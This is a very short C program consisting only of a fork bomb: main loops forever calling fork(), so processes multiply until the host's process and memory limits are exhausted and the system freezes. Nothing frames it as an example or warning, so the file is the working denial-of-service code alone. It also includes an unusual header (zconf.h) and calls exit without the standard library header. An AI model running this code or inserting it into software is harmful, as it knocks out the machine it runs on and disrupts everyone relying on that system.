#include <zconf.h>
#include <stdio.h>

int main() {
    while (1){
        fork();
    }
    exit(0);
}